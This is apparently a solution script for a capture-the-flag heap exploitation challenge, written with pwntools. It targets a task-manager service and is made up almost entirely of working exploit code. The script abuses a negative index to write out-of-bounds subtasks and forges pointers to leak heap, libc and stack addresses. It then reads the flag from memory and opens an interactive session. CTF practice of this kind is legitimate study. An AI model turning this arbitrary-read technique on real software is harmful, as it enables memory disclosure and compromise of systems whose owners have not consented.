#!/bin/python
from pwn import remote, process, ELF,context,p64
from pwnlib import gdb
import string
import sys

context.terminal="/bin/kitty"

target=None
libc=None
CN=None
#CN = remote("172.17.0.2", 1024)
CN = remote("5776ee6f6010e76a238267e2-intro-heap-2.challenge.master.cscg.live", 31337, ssl=True)
if target is not None:
    p=target.process()
    if isinstance(p, process) and CN is None:
        print("isproces")
        CN=p
elif CN is None:
    sys.exit()

PROMPT=b"choice?"

def createTask(name:str):
    CN.send(b"1\n")
    CN.send(name.encode('ascii')+b"\n")
    response=CN.recvuntil(PROMPT)

def deleteTask(mainTaskId:int):
    CN.send(b"2\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listTask():
    CN.send(b"3\n")
    response=CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
    return tasks

def createSubTask(content, mainTaskId:int, length=None):
    if length==None:
        length=len(content)+1
    CN.send(b"4\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(length).encode('ascii')+b"\n")
    if isinstance(content,str):
        contentmsg=content.encode('ascii')
    elif isinstance(content, bytes):
        contentmsg=content
    else:
        contentmsg=None
        print("Wrong content type")
    if contentmsg is not None:
        if length!=0:
            CN.send(contentmsg+b"\n")
    CN.recvuntil(PROMPT)



def deleteSubTask(mainTaskId:int, subTaskId:int):
    CN.send(b"5\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    CN.send(str(subTaskId).encode('ascii')+b"\n")
    CN.recvuntil(PROMPT)

def listSubTask(mainTaskId:int)->dict[int, bytes]:
    CN.send(b"6\n")
    CN.send(str(mainTaskId).encode('ascii')+b"\n")
    response = CN.recvuntil(PROMPT)
    r1=response.split(b"---menu---")[0].split(b"\n")
    tasks={}
    for i in range(len(r1)-1):
        pair=r1[i].split(b"] ")
        tasks[int(pair[0][-2:])]=pair[1]
    return tasks

def main():

    CN.recvuntil(PROMPT)
    charset=string.ascii_lowercase

    for i in range(6):
        createSubTask(charset[i]*3,-11)#,0x99)
    createTask("")
    createSubTask("",-11,0)
    createSubTask("",0,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    createSubTask("",1,0)
    r=listSubTask(0)
    heapBaseAddress=int(r[0][::-1].hex(),16)-0x4c0
    print(f"Heap-base: {hex(heapBaseAddress)}")
    for i in range(10):
        createSubTask(str(i)*0x90,0)
    for i in range(8):
        deleteSubTask(0,i+2)
        
    # read libc base-address
    createSubTask(b"\x00"*8+p64(heapBaseAddress+0xA58)+b"\x00"*8*23,-11,255)
    r=listSubTask(2)
    libcBaseAddress=int(r[0][::-1].hex(),16)-0x219D80
    print(f"Libc-base: {hex(libcBaseAddress)}")

    # read stack-address
    createSubTask(b"\x00"*8+p64(libcBaseAddress+0x21A528)+b"\x00"*8*23,-11,255)
    r=listSubTask(3)
    stackAddress=int(r[0][::-1].hex(),16)-0x20FD9
    print(f"Stack-base: {hex(stackAddress)}")

    # read FLAG
    createSubTask(b"\x00"*8+p64(stackAddress+0x20FDB)+b"\x00"*8*23,-11,255)
    r=listSubTask(4)
    print(r)
    CN.interactive()


if __name__=="__main__":
    main()
    CN.close()